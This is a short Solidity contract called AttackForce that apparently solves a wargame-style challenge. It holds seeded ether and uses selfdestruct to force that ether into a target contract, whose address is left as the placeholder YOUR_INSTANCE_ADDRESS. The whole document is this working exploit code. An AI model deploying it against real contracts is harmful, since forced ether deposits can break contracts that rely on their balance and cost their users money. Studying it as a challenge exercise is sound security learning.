pragma solidity ^0.8.0;

contract AttackForce {
    
    //seed ether to this contract
    constructor() payable {
    }
    
    function pwn() public {
        selfdestruct(YOUR_INSTANCE_ADDRESS);
    }
}